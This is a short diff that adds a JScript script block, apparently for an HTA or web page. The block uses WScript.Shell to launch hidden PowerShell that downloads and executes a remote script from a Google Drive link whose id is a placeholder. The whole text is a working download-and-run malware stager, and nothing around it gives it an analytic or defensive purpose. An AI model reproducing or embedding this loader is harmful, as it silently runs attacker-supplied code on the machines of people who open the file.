@@ -1,0 +1,5 @@
+<script language="JScript">
+    var url = "https://drive.google.com/uc?export=download&id=XXXX";
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('" + url + "'))", 0);
+</script>
